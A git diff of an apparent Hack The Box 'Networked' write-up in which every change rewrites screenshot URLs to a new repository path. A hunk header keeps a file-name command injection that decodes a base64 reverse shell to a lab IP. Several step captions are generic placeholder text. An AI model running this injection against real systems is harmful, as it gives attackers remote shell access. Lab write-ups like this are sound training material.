@@ -4,7 +4,7 @@ published: true
 description: "Comprehensive offensive security assessment and penetration testing report for Networked (Hack The Box). Methodological analysis covering initial access, local privilege escalation, and OffSec remediation."
 tags: cybersecurity, hackthebox, pentesting, infosec
 series: "HackTheBox Enterprise Assessments"
-cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_01.png"
+cover_image: "https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_01.png"
 ---
 
 # Offensive Security Assessment Report: Networked
@@ -78,7 +78,7 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 * **Observed Evidence / Output:** 2.4.6
 
 
-![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_01.png)
+![step_01.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_01.png)
 * **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.
 
 
@@ -88,7 +88,7 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 * **Observed Evidence / Output:** /backup
 
 
-![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_02.png)
+![step_02.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_02.png)
 * **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.
 
 
@@ -97,7 +97,7 @@ cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/mai
 * **Observed Evidence / Output:** png
 
 
-![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_03.png)
+![step_03.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_03.png)
 * **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -106,14 +106,14 @@ MIME types protect website upload functions from uploading files that are not ac
 * **Observed Evidence / Output:** 89504E470D0A1A0A
 
 
-![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_04.png)
+![step_04.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_04.png)
 * **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 hexedit
 
 
-![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_05.png)
+![step_05.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_05.png)
 * **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -122,7 +122,7 @@ hexedit
 * **Observed Evidence / Output:** cron
 
 
-![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_06.png)
+![step_06.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_06.png)
 * **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -131,7 +131,7 @@ hexedit
 * **Observed Evidence / Output:** 3
 
 
-![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_07.png)
+![step_07.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_07.png)
 * **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -140,7 +140,7 @@ hexedit
 * **Observed Evidence / Output:** $value
 
 
-![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_08.png)
+![step_08.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_08.png)
 * **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -149,12 +149,12 @@ hexedit
 * **Observed Evidence / Output:** e5a5724d0677418e852a52b23e8f35ea
 
 
-![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_09.png)
+![step_09.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_09.png)
 * **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
 
-![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_10.png)
+![step_10.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_10.png)
 * **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
 
@@ -171,7 +171,7 @@ touch 'x;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMS
 * **Observed Evidence / Output:** changename.sh
 
 
-![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_11.png)
+![step_11.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_11.png)
 * **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.
 
 
@@ -180,7 +180,7 @@ touch 'x;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMS
 * **Observed Evidence / Output:** 150cf7faa877b907fe2de2d25514e0c2
 
 
-![step_12.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/networked/images/step_12.png)
+![step_12.png](https://raw.githubusercontent.com/araizcorp/araizcorp-writeups/main/hackthebox/networked/images/step_12.png)
 * **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.
 
 ---
